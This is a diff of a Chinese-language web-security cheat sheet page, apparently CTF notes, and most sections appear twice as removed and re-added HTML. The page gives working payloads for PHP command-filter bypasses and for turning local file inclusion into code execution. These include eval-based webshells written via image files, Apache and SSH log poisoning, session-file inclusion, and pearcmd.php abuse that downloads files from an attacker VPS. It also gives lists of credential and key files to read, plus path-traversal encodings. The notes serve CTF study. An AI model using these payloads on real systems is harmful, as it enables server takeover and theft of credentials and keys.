class="hljs-symbol">#SHLVL</span>&#125;&#125; ?<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??   #应该是这个：nl flag<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;?<span class="hljs-string">$&#123;</span><span class="hljs-type">USER</span>:~<span class="hljs-type">A</span>&#125;? ????   #/bin/cat flag<br>&lt;<span class="hljs-type">A</span>;<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;?????<span class="hljs-string">$&#123;</span><span class="hljs-type">RANDOM</span>::<span class="hljs-string">$?</span>&#125; ????      #/bin/base64 flag<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="无参数-无数字字母RCE"><a href="#无参数-无数字字母RCE" class="headerlink" title="无参数&#x2F;无数字字母RCE"></a>无参数&#x2F;无数字字母RCE</h3><p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107#toc-0%E3%80%81https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/8107#toc-0、https://xz.aliyun.com/t/9360</a></p>
-<p>过滤system <code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code></p>
-<h4 id="1-一些常用函数"><a href="#1-一些常用函数" class="headerlink" title="(1)一些常用函数"></a>(1)一些常用函数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 打印字符串（可以用连接符）、数组、对象。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span> 扫描目录下的文件<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span> 返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span> 返回一包含本地数字及货币格式信息的数组<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span> 与current差不多<br>可以执行<span class="hljs-selector-tag">a</span>(<span class="hljs-selector-tag">b</span>(<span class="hljs-built_in">c</span>()))形式时，<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>()))) 读当前目录文件<br></code></pre></td></tr></table></figure>
-
-<h4 id="2-读取文件函数"><a href="#2-读取文件函数" class="headerlink" title="(2)读取文件函数"></a>(2)读取文件函数</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">file_get_contents</span>() 把整个文件读入一个字符串中<br><span class="hljs-built_in">file</span>() 把整个文件读入一个数组中;<br><span class="hljs-built_in">readfile</span>() 读入一个文件并写入到输出缓冲;<br><span class="hljs-built_in">highlight_file</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">show_source</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">array_flip</span>() 将读取当前目录的键和值进行反转<br><span class="hljs-built_in">array_rand</span>() 随机输出键<br></code></pre></td></tr></table></figure>
-
-<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>example：</p>
+<p>传参 <code>?a[b.=system("ls");</code></p>
+<h5 id="一些组合拳payload">一些组合拳payload</h5>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">tac&lt;/fla\g.php||<br>awk%<span class="hljs-number">09</span><span class="hljs-string">&#x27;/f/&#123;print&#125;&#x27;</span>%<span class="hljs-number">09</span>/fla?||<br>uniq<span class="hljs-string">$&#123;</span><span class="hljs-type">IFS</span>&#125;/f???<br>/???/????<span class="hljs-number">64</span> /????<br>uniq `expr substr <span class="hljs-string">$P</span>ATH <span class="hljs-number">11</span>`f*<br>od -c <span class="hljs-string">$&#123;</span><span class="hljs-type">OLDPWD</span>&#125;flag<br>cat <span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-number">0</span>:<span class="hljs-number">1</span>&#125;f*<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#LESS</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-type">SHLVL</span>&#125;&#125;   <span class="hljs-symbol">#ls</span><br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125; ?<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??   #应该是这个：nl flag<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;?<span class="hljs-string">$&#123;</span><span class="hljs-type">USER</span>:~<span class="hljs-type">A</span>&#125;? ????   #/bin/cat flag<br>&lt;<span class="hljs-type">A</span>;<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;?????<span class="hljs-string">$&#123;</span><span class="hljs-type">RANDOM</span>::<span class="hljs-string">$?</span>&#125; ????      #/bin/base64 flag<br></code></pre></td></tr></table></figure>
+<h3 id="无参数无数字字母rce">无参数/无数字字母RCE</h3>
+<p>参考https://xz.aliyun.com/t/8107#toc-0、https://xz.aliyun.com/t/9360</p>
+<p>过滤system
+<code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code></p>
+<h4 id="一些常用函数">(1)一些常用函数</h4>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 打印字符串（可以用连接符）、数组、对象。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span> 扫描目录下的文件<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span> 返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span> 返回一包含本地数字及货币格式信息的数组<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span> 与current差不多<br>可以执行<span class="hljs-selector-tag">a</span>(<span class="hljs-selector-tag">b</span>(<span class="hljs-built_in">c</span>()))形式时，<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>()))) 读当前目录文件<br></code></pre></td></tr></table></figure>
+<h4 id="读取文件函数">(2)读取文件函数</h4>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">file_get_contents</span>() 把整个文件读入一个字符串中<br><span class="hljs-built_in">file</span>() 把整个文件读入一个数组中;<br><span class="hljs-built_in">readfile</span>() 读入一个文件并写入到输出缓冲;<br><span class="hljs-built_in">highlight_file</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">show_source</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">array_flip</span>() 将读取当前目录的键和值进行反转<br><span class="hljs-built_in">array_rand</span>() 随机输出键<br></code></pre></td></tr></table></figure>
+<h2 id="lfi_to_rce">LFI_to_RCE</h2>
+<p>example：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="图片马getshell"><a href="#图片马getshell" class="headerlink" title="图片马getshell"></a>图片马getshell</h3><p>条件：<br><code>allow_url_include=on</code><br><code>allow_url_fopen=on</code></p>
+<h3 id="图片马getshell">图片马getshell</h3>
+<p>条件： <code>allow_url_include=on</code>
+<code>allow_url_fopen=on</code></p>
 <p>图片马内容，会在当前目录下生成shell.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="临时文件-phpinfo条件竞争getshell、"><a href="#临时文件-phpinfo条件竞争getshell、" class="headerlink" title="临时文件+phpinfo条件竞争getshell、"></a>临时文件+phpinfo条件竞争getshell、</h3><p>基本没遇到过，写个思路以及别人的方法，遇到了再深入</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43576303/article/details/119105376">思路</a>：实质上是连续传输很大的字节到服务器导致删除文件有时间差，包含临时的&#x2F;tmp&#x2F;6字节长度文件名php </p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">脚本</a>：python2的脚本</p>
-<h3 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h3><h4 id="apache日志文件"><a href="#apache日志文件" class="headerlink" title="apache日志文件"></a>apache日志文件</h4><p>条件：<br>apache日志文件路径已知，或配置文件路径已知，有可读权限</p>
+<h3
+id="临时文件phpinfo条件竞争getshell">临时文件+phpinfo条件竞争getshell、</h3>
+<p>基本没遇到过，写个思路以及别人的方法，遇到了再深入</p>
+<p><a
+target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43576303/article/details/119105376">思路</a>：实质上是连续传输很大的字节到服务器导致删除文件有时间差，包含临时的/tmp/6字节长度文件名php</p>
+<p><a
+target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">脚本</a>：python2的脚本</p>
+<h3 id="日志getshell">日志getshell</h3>
+<h4 id="apache日志文件">apache日志文件</h4>
+<p>条件： apache日志文件路径已知，或配置文件路径已知，有可读权限</p>
 <p>先看<code>/etc/init.d/httpd</code>或<code>/etc/httpd/conf/httpd.conf</code>找到log文件路径</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>payload：<br>?file=/usr/local/apache/logs/error_log<br>?file=/usr/local/apache/logs/access_log<br><br>?file=shell.php<br></code></pre></td></tr></table></figure>
-
-<h4 id="ssh日志文件"><a href="#ssh日志文件" class="headerlink" title="ssh日志文件"></a>ssh日志文件</h4><p>条件<br>SSH日志路径已知，有可读权限</p>
+<h4 id="ssh日志文件">ssh日志文件</h4>
+<p>条件 SSH日志路径已知，有可读权限</p>
 <p>将ssh用户名写为php马，ssh自动写入<code>/var/log/auth.log</code></p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@192.168.136.143</span><br><span class="language-xml"></span><br><span class="language-xml">payload：</span><br><span class="language-xml">?file=/var/log/auth.log</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="Session文件包含getshell"><a href="#Session文件包含getshell" class="headerlink" title="Session文件包含getshell"></a>Session文件包含getshell</h3><p>条件：<br><code>php&gt;=5.4</code><br><code>session.upload_progress.enable = on</code><br>已知<code>session.save_path</code></p>
+<h3 id="session文件包含getshell">Session文件包含getshell</h3>
+<p>条件： <code>php&gt;=5.4</code>
+<code>session.upload_progress.enable = on</code>
+已知<code>session.save_path</code></p>
 <p>分为两种</p>
-<ol>
-<li>session.upload_progress.cleanup &#x3D; on</li>
+<ol type="1">
+<li>session.upload_progress.cleanup = on</li>
 </ol>
 <p>文件会清空，需要条件竞争</p>
-<ol>
-<li>session.upload_progress.cleanup &#x3D; off</li>
+<ol type="1">
+<li>session.upload_progress.cleanup = off</li>
 </ol>
 <p>文件不会清空，直接包含<code>session.save_path+session.upload_progress.prefix+session_id</code>文件</p>
-<h3 id="pearcmd-php文件包含getshell"><a href="#pearcmd-php文件包含getshell" class="headerlink" title="pearcmd.php文件包含getshell"></a>pearcmd.php文件包含getshell</h3><p>条件<br>安装了pear扩展<br>已知<code>pearcmd.php</code>路径(默认路径是<code>/usr/local/lib/php/pearcmd.php</code>)<br><code>register_argc_argv=on</code>（只有开启了，<code>$_SERVER[&#39;argv&#39;]</code>才会生效。）</p>
+<h3 id="pearcmd.php文件包含getshell">pearcmd.php文件包含getshell</h3>
+<p>条件 安装了pear扩展
+已知<code>pearcmd.php</code>路径(默认路径是<code>/usr/local/lib/php/pearcmd.php</code>)
+<code>register_argc_argv=on</code>（只有开启了，<code>$_SERVER['argv']</code>才会生效。）</p>
 <p>三种方法</p>
 <p>config-create</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure>
-
 <p>install</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+install+</span>--installroot<span class="hljs-code">+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test.php<br></code></pre></td></tr></table></figure>
-
 <p>download</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+download+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure>
-
-<p>具体参考：<a target="_blank" rel="noopener" href="https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html">pearcmd文件包含getshell</a></p>
-<h2 id="文件读取利用"><a href="#文件读取利用" class="headerlink" title="文件读取利用"></a>文件读取利用</h2><h3 id="常见读取的敏感文件路径"><a href="#常见读取的敏感文件路径" class="headerlink" title="常见读取的敏感文件路径"></a>常见读取的敏感文件路径</h3><p>参考<a target="_blank" rel="noopener" href="https://www.buaq.net/go-161450.html">https://www.buaq.net/go-161450.html</a></p>
-<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br></code></pre></td></tr></table></figure>
-
-<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/authorized_keys /</span><span class="hljs-operator">/</span>如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa /</span><span class="hljs-operator">/</span>ssh私钥,ssh公钥是id_rsa.pub<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_ras.keystore /</span><span class="hljs-operator">/</span>记录每个访问计算机用户的公钥<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/known_hosts  /</span><span class="hljs-regexp">/ssh会把每个访问过计算机的公钥(public key)都记录在~/</span>.ssh<span class="hljs-operator">/</span>known_hosts<span class="hljs-operator">。</span>当下次访问相同计算机时，<span class="hljs-type">OpenSSH会核对公钥</span><span class="hljs-operator">。</span>如果公钥不同，<span class="hljs-type">OpenSSH会发出警告，</span> 避免你受到<span class="hljs-type">DNS</span> <span class="hljs-type">Hijack之类的攻击</span><span class="hljs-operator">。</span><br><span class="hljs-regexp">/etc/</span>passwd <span class="hljs-comment">// 账户信息</span><br><span class="hljs-regexp">/etc/</span>shadow <span class="hljs-comment">// 账户密码文件</span><br><span class="hljs-regexp">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf <span class="hljs-comment">// Apache配置文件</span><br><span class="hljs-regexp">/etc/</span>redhat<span class="hljs-operator">-</span>release 系统版本 <br><span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-regexp">/root/</span>.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">*</span>(文件标识符)<br><span class="hljs-regexp">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-regexp">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-regexp">/porc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cmdline /</span><span class="hljs-operator">/</span>当前进程的cmdline参数<br><span class="hljs-regexp">/proc/</span>sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br><span class="hljs-regexp">/proc/</span>pid<span class="hljs-operator">/</span>cmdline   则可以看到对应pid进程的完整命令行<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-operator">/</span>fib_trie   内网<span class="hljs-type">IP</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ   环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>loginuid   当前用户<br></code></pre></td></tr></table></figure>
-
-<h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>可以进行fuzz</p>
+<p>具体参考：<a
+target="_blank" rel="noopener" href="https://xilitter.github.io/2023/01/31/利用pearcmd-php文件包含拿shell（LFI）/index.html">pearcmd文件包含getshell</a></p>
+<h2 id="文件读取利用">文件读取利用</h2>
+<h3 id="常见读取的敏感文件路径">常见读取的敏感文件路径</h3>
+<p>参考https://www.buaq.net/go-161450.html</p>
+<h4 id="windows">windows</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br></code></pre></td></tr></table></figure>
+<h4 id="linux">Linux</h4>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/authorized_keys /</span><span class="hljs-operator">/</span>如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa /</span><span class="hljs-operator">/</span>ssh私钥,ssh公钥是id_rsa.pub<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_ras.keystore /</span><span class="hljs-operator">/</span>记录每个访问计算机用户的公钥<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/known_hosts  /</span><span class="hljs-regexp">/ssh会把每个访问过计算机的公钥(public key)都记录在~/</span>.ssh<span class="hljs-operator">/</span>known_hosts<span class="hljs-operator">。</span>当下次访问相同计算机时，<span class="hljs-type">OpenSSH会核对公钥</span><span class="hljs-operator">。</span>如果公钥不同，<span class="hljs-type">OpenSSH会发出警告，</span> 避免你受到<span class="hljs-type">DNS</span> <span class="hljs-type">Hijack之类的攻击</span><span class="hljs-operator">。</span><br><span class="hljs-regexp">/etc/</span>passwd <span class="hljs-comment">// 账户信息</span><br><span class="hljs-regexp">/etc/</span>shadow <span class="hljs-comment">// 账户密码文件</span><br><span class="hljs-regexp">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf <span class="hljs-comment">// Apache配置文件</span><br><span class="hljs-regexp">/etc/</span>redhat<span class="hljs-operator">-</span>release 系统版本 <br><span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-regexp">/root/</span>.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">*</span>(文件标识符)<br><span class="hljs-regexp">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-regexp">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-regexp">/porc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cmdline /</span><span class="hljs-operator">/</span>当前进程的cmdline参数<br><span class="hljs-regexp">/proc/</span>sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br><span class="hljs-regexp">/proc/</span>pid<span class="hljs-operator">/</span>cmdline   则可以看到对应pid进程的完整命令行<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-operator">/</span>fib_trie   内网<span class="hljs-type">IP</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ   环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>loginuid   当前用户<br></code></pre></td></tr></table></figure>
+<h3 id="绕过思路">绕过思路</h3>
+<p>可以进行fuzz</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url编码代替.或者/，如使用<span class="hljs-variable">%2</span>F代替/<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>二次编码(<span class="hljs-variable">%25</span>)<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>加入+<br>?filename<span class="hljs-operator">=</span>.+./.+./bin/redacted.dll<br><span class="hljs-variable">%00</span><br>?filename<span class="hljs-operator">=</span>.<span class="hljs-variable">%00</span>./file.php/etc/passwd<span class="hljs-variable">%00</span>.jpg<br>\<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>/windows/win.iniJava <br><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span> 安全模式绕过<br>?filename<span class="hljs-operator">=</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span 